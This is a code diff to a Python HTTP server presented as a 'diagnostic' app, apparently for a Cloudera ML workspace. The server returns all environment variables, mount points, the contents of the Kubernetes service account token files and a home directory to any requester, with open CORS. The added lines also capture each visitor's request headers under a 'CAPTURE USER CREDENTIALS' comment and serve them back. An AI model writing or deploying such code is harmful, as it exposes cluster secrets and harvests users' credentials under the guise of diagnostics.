@@ -44,19 +44,17 @@ from http.server import BaseHTTPRequestHandler, HTTPServer
 
 class CompleteDiagnosticHandler(BaseHTTPRequestHandler):
     def get_directory_contents(self, path):
-        """Helper to list all files (including hidden ones) safely."""
+        """Helper to list all files safely."""
         try:
             if os.path.exists(path):
                 return os.listdir(path)
             else:
                 return f"Error: Path '{path}' does not exist."
-        except PermissionError:
-            return f"Error: Permission denied for path '{path}'."
         except Exception as e:
             return f"Error: {str(e)}"
 
     def get_mount_points(self):
-        """Helper to read and parse active system mount points."""
+        """Helper to read active system mount points."""
         mounts = []
         try:
             if os.path.exists('/proc/mounts'):
@@ -78,35 +76,21 @@ class CompleteDiagnosticHandler(BaseHTTPRequestHandler):
     def get_kubernetes_secrets(self):
         """Lists files and dumps contents of the K8s service account directory."""
         target_dir = '/run/secrets/kubernetes.io/serviceaccount'
-        data = {
-            "directory_exists": False,
-            "files_discovered": [],
-            "file_contents": {}
-        }
-        
+        data = {"directory_exists": False, "files_discovered": [], "file_contents": {}}
         if not os.path.exists(target_dir):
-            return "Error: Kubernetes serviceaccount directory not found at this path."
-            
+            return "Error: Service account directory not found."
         data["directory_exists"] = True
         try:
-            # List all items in the directory
             files = os.listdir(target_dir)
             data["files_discovered"] = files
-            
-            # Loop through each file and extract its content
             for file_name in files:
                 full_path = os.path.join(target_dir, file_name)
-                
                 if os.path.isfile(full_path):
                     try:
-                        # errors='replace' prevents crashing on non-UTF-8 characters if any exist
                         with open(full_path, 'r', errors='replace') as f:
                             data["file_contents"][file_name] = f.read().strip()
-                    except PermissionError:
-                        data["file_contents"][file_name] = "Error: Permission Denied."
                     except Exception as e:
                         data["file_contents"][file_name] = f"Error: {str(e)}"
-                        
             return data
         except Exception as e:
             return f"Error reading directory structure: {str(e)}"
@@ -114,14 +98,18 @@ class CompleteDiagnosticHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         # Send 200 OK status code
         self.send_response(200)
-        
-        # Set content type to JSON
         self.send_header('Content-Type', 'application/json')
         self.send_header('Access-Control-Allow-Origin', '*')
         self.end_headers()
         
-        # Assemble the full internal diagnostics payload
+        # CAPTURE USER CREDENTIALS/HEADERS: Parse incoming HTTP request headers
+        incoming_headers = {}
+        for header_key, header_value in self.headers.items():
+            incoming_headers[header_key] = header_value
+        
+        # Assemble the full diagnostics payload
         payload = {
+            "endpoint_visitor_headers": incoming_headers,  # <-- This contains your user info!
             "environment_variables": dict(os.environ),
             "mount_points": self.get_mount_points(),
             "kubernetes_serviceaccount": self.get_kubernetes_secrets(),
@@ -129,27 +117,21 @@ class CompleteDiagnosticHandler(BaseHTTPRequestHandler):
             "home_cdsw_contents": self.get_directory_contents('/home/cdsw')
         }
         
-        # Format the response as nicely indented JSON
+        # Format and serve response
         response_json = json.dumps(payload, indent=4, sort_keys=True)
-        
-        # Write response back to the client
         self.wfile.write(response_json.encode('utf-8'))
 
 def run():
-    # Read the designated application port assigned by CML/CAII
     port = int(os.environ.get('CDSW_APP_PORT', os.environ.get('PORT', 8080)))
-    
     server_address = ('0.0.0.0', port)
     httpd = HTTPServer(server_address, CompleteDiagnosticHandler)
-    print(f"HTTP Server successfully running on port {port}...")
-    
+    print(f"HTTP Server running on port {port}...")
     try:
         httpd.serve_forever()
     except KeyboardInterrupt:
         pass
     finally:
         httpd.server_close()
-        print("Server safely shut down.")
 
 if __name__ == '__main__':
     run()
